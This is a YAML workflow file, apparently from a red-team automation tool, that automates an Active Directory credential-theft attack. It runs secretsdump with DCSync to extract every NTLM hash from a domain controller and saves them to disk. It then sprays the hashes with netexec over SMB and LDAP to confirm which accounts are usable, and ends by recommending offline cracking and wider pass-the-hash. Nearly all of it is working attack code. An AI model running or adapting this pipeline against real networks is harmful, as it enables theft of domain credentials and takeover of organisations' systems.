name: ad-dump-creds
description: |
  AD credential dumping pipeline — extracts NTLM hashes via secretsdump
  (DCSync/NTDS), then validates extracted hashes with pass-the-hash
  spraying using netexec across SMB and LDAP.
tags: [redteam, ad, credentials, secretsdump, pth, dcsync]
dispatch:
  inputs:
    log_command:
      type: string
      default: "true"
      description: Enable command log entries for steps when set to true/false.
    log_output:
      type: string
      default: "true"
      description: Enable stdout output log files for steps when set to true/false.
    target:
      required: true
      type: string
      description: Domain controller IP or hostname
      alias: t
    domain:
      required: true
      type: string
      description: Domain name (e.g. corp.local)
    user:
      required: true
      type: string
      description: Domain username (needs DCSync or DA privileges)
    password:
      type: string
      default: ''
      description: Password
    hash:
      type: string
      default: ''
      description: NTLM hash for pass-the-hash (LM:NT format)

defaults:
  store-creds: true

jobs:
  dump-secrets:
    name: Credential Extraction (secretsdump)
    outputs:
      hash_count: '{{ steps["collect-hashes"].outputs.hash_count | default("", true) }}'
      hash_file: '{{ steps["collect-hashes"].outputs.hash_file | default("", true) }}'
      admin_count: '{{ steps["collect-hashes"].outputs.admin_count | default("", true) }}'
    steps:
      - task: secretsdump
        name: dcsync-dump
        with:
          target: "{{ inputs.target }}"
          username: "{{ inputs.user }}"
          password: "{{ inputs.password }}"
          hash: "{{ inputs.hash }}"
          domain: "{{ inputs.domain }}"
          just_dc_ntlm: true
        continue-on-error: true
        log-stdout: "{{ inputs.log_output | default(true) }}"
        log-command: "{{ inputs.log_command | default(true) }}"
      - name: collect-hashes
        script: |
          creds = {{ users(steps["dcsync-dump"].outputs.typed_outputs) | tojson }}

          hash_lines = []
          admin_accounts = []
          for c in creds:
              user = c.get('username', '')
              h = c.get('hash', '')
              domain = c.get('domain', '')
              priv = c.get('privilege_level', '')

              if h:
                  hash_lines.append(f"{domain}\\{user}:::{h}" if domain else f"{user}:::{h}")
              if priv and 'admin' in priv.lower():
                  admin_accounts.append(user)

          hash_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_secretsdump_hashes.txt"
          with open(hash_file, 'w') as f:
              f.write('\n'.join(hash_lines))

          add_outputs(hash_count=len(hash_lines), hash_file=hash_file, admin_count=len(admin_accounts))
          print(f"[+] Secretsdump extracted {len(hash_lines)} NTLM hashes")
          print(f"[+] Admin accounts found: {len(admin_accounts)}")
          for a in admin_accounts[:20]:
              print(f"  [*] {a}")

  spray-hashes:
    name: Pass-the-Hash Validation
    needs: [dump-secrets]
    outputs:
      valid_count: '{{ steps["pth-summary"].outputs.valid_count | default("", true) }}'
    steps:
      - name: extract-top-hashes
        script: |
          from pathlib import Path

          hash_file = '{{ jobs["dump-secrets"].outputs.hash_file }}'
          hashes = []
          try:
              for line in Path(hash_file).read_text().splitlines():
                  parts = line.strip().split(':::')
                  if len(parts) == 2 and parts[1]:
                      hashes.append({'user': parts[0], 'hash': parts[1]})
          except Exception:
              pass

          # Take top 10 unique hashes for spraying
          seen = set()
          unique = []
          for h in hashes:
              if h['hash'] not in seen:
                  seen.add(h['hash'])
                  unique.append(h)
              if len(unique) >= 10:
                  break

          if unique:
              user_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_pth_users.txt"
              hash_val = unique[0]['hash']
              with open(user_file, 'w') as f:
                  f.write('\n'.join(h['user'].split('\\')[-1] for h in unique))
              add_outputs(user_file=user_file, spray_hash=hash_val, spray_count=len(unique))
          else:
              add_outputs(user_file='', spray_hash='', spray_count=0)

          print(f"[+] Prepared {len(unique)} unique hashes for PtH validation")
      - task: netexec
        name: pth-smb
        with:
          target: "{{ inputs.target }}"
          protocol: smb
          username: "{{ steps['extract-top-hashes'].outputs.user_file }}"
          hash: "{{ steps['extract-top-hashes'].outputs.spray_hash }}"
          domain: "{{ inputs.domain }}"
        continue-on-error: true
        log-stdout: "{{ inputs.log_output | default(true) }}"
        log-command: "{{ inputs.log_command | default(true) }}"
      - task: netexec
        log-command: "{{ inputs.log_command | default(true) }}"
        name: pth-ldap
        with:
          target: "{{ inputs.target }}"
          protocol: ldap
          username: "{{ steps['extract-top-hashes'].outputs.user_file }}"
          hash: "{{ steps['extract-top-hashes'].outputs.spray_hash }}"
          domain: "{{ inputs.domain }}"
        continue-on-error: true
      - name: pth-summary
        script: |
          smb_valid = {{ users(steps["pth-smb"].outputs.typed_outputs) | tojson }}
          ldap_valid = {{ users(steps["pth-ldap"].outputs.typed_outputs) | tojson }}

          all_valid = set()
          for u in smb_valid + ldap_valid:
              if u.get('username'):
                  all_valid.add(u['username'])

          add_outputs(valid_count=len(all_valid))
          print(f"[+] PtH validation: {len(all_valid)} accounts confirmed active")

  report:
    name: Credential Dump Report
    needs: [dump-secrets, spray-hashes]
    steps:
      - name: final-report
        script: |
          hash_count = '{{ jobs["dump-secrets"].outputs.hash_count }}'
          admin_count = '{{ jobs["dump-secrets"].outputs.admin_count }}'
          valid_count = '{{ jobs["spray-hashes"].outputs.valid_count }}'

          print("=" * 55)
          print(" AD CREDENTIAL DUMP REPORT")
          print("=" * 55)
          print(f"  Target DC:       {{ inputs.target }}")
          print(f"  Domain:          {{ inputs.domain }}")
          print("-" * 55)
          print(f"  NTLM hashes extracted:    {hash_count}")
          print(f"  Admin accounts found:     {admin_count}")
          print(f"  PtH validated accounts:   {valid_count}")
          print("-" * 55)

          if int(hash_count or 0) > 0:
              print("\n  [!] Recommendations:")
              print("      - Crack hashes offline: ofx flow run ad-kerberoast-task ...")
              print("      - Expand PtH: try all hashes against other hosts")
              print("      - Check for password reuse across services")
          else:
              print("\n  [-] No hashes extracted — verify DCSync privileges")
        log-stdout: "{{ inputs.log_output | default(true) }}"
